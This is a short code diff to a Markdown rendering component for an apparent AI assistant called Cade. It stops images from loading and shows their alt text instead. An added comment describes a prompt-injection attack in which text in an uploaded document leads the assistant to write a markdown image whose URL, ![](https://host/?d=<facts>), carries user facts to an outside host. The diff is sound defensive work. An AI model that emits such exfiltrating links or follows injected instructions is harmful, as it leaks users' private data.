@@ -10,6 +10,11 @@ import remarkGfm from "remark-gfm";
  * Route Handler (app/documents/[id]/route.ts), so plain hrefs work. The
  * old Vite app rewrote agent-served paths through apiUrl() to cross
  * origins.
+ *
+ * Images never load. The browser fetches an image with no click, so a
+ * prompt injection (in an uploaded document, or in text Cade reads back)
+ * could have Cade write ![](https://host/?d=<facts>) and send the facts
+ * out. Cade's replies never need images; the alt text stays visible.
  */
 
 export function Markdown({ children }: { children: string }) {
@@ -27,6 +32,7 @@ export function Markdown({ children }: { children: string }) {
             {children}
           </a>
         ),
+        img: ({ alt }) => (alt ? <span className="text-ink-secondary">[{alt}]</span> : null),
         p: ({ children }) => <p className="mb-3 last:mb-0">{children}</p>,
         ul: ({ children }) => (
           <ul className="mb-3 list-disc space-y-1 pl-5 last:mb-0">{children}</ul>
